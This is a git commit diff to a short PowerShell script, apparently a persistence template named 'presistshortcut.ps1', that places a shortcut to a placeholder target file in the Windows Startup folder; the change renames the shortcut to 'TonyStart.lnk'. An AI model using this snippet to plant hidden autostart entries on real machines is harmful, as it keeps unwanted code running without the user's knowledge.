cf54ccb4079a08bbdb406260d8b17656ebd333a9
spl4shc4sh <95105945+spl4shc4sh@users.noreply.github.com>
2021-11-27 02:46:22 +0300

    Update presistshortcut.ps1

--- presistshortcut.ps1
+++ presistshortcut.ps1
@@ -1,5 +1,5 @@
 $TargetFile =  "%FULLFILENAME%"
-$ShortcutFile = "$HOME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/%FILENAME%"
+$ShortcutFile = "$HOME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/TonyStart.lnk"
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
 $Shortcut.Arguments=""
